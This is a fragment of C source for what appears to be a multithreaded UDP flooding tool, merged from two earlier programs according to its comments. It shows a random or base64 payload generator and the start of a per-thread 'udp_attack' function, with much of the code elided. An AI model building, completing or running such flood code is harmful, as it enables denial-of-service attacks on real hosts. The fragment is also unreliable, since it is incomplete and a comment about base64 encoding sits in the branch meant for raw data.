...
// Generate random payload (from Code A, with base64 option)
void generate_payload(char *buffer, size_t size, unsigned int seed, int use_base64) {
    ...
    if (!use_base64) {
        ...
        // Generate random data and encode it in base64
        char temp[size];
        for (size_t i = 0; i < size; i++) {
...
// UDP attack function (combined from both codes)
void *udp_attack(void *arg) {
    ...
    // Generate payload (random or base64-encoded)
    char *payload = (char *)malloc(config->payload_size + 1);
    if (!payload) {
        fprintf(stderr, "[!] Thread %ld: Memory allocation failed\n", pthread_self());
        close(sock);
        return NULL;
    }
    generate_payload(payload, config->payload_size, time(NULL) ^ pthread_self(), 1); // Use base64 for variety
